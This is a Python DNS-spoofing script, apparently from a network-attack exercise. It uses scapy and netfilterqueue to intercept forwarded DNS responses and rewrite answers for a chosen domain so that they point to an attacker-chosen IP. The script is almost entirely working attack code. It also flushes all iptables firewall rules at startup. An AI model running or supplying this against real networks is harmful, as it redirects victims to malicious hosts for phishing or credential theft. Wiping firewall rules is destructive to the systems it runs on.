#! /usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import subprocess
import argparse
import re
def get_arguments() :
    parser = argparse.ArgumentParser(prog="dns_spoof",description='DNS spoofing arguments.')
    parser.add_argument("-t", "--target", dest="target_url", help="Target URL")
    parser.add_argument("-r","--replacement",dest="replacement_url", help="new URL(replacement URL)\n This URL Type is IP")
    options = parser.parse_args()
    if not options.target_url :
        parser.error("[-] Please specify a Target URL, use --help for more info.")
    elif not options.replacement_url :
        parser.error("[-] Please specify a new URL (replacement URL), use --help for more info.")
    return options
def get_ip(url) :
    ifconfig_result = subprocess.run(['ping', '-c', '1', url], capture_output=True, text=True)
    url_address_search_result = re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b')
    ip_addr = url_address_search_result.search(ifconfig_result.stdout)
    if ip_addr :
        return ip_addr.group(0)
    else :
        print("[-] Could not read URL")
        return
def get_source() :
    options = get_arguments()
    source_ip = get_ip(options.replacement_url)
    return source_ip
def process_packet(packet) :
    options = get_arguments()
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR) :
        qname = scapy_packet[scapy.DNSQR].qname
        if str(options.target_url) in qname.decode():
            print("[+] Spoofing target")
            print(source)
            answer = scapy.DNSRR(rrname=qname,rdata=source)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            print("[+] "+options.target_url+" -> "+options.replacement_url)

            packet.set_payload(bytes(scapy_packet))
    packet.accept()
def run() :
    queue = netfilterqueue.NetfilterQueue() #create queue
    queue.bind(1, process_packet)  # connecting queue
    queue.run() #queue start

if __name__ in "__main__" :
    subprocess.call(["sudo", "iptables", "--flush"])
    source = get_source()
    # subprocess.call(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "1"])
    # subprocess.call(["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "1"])
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    run()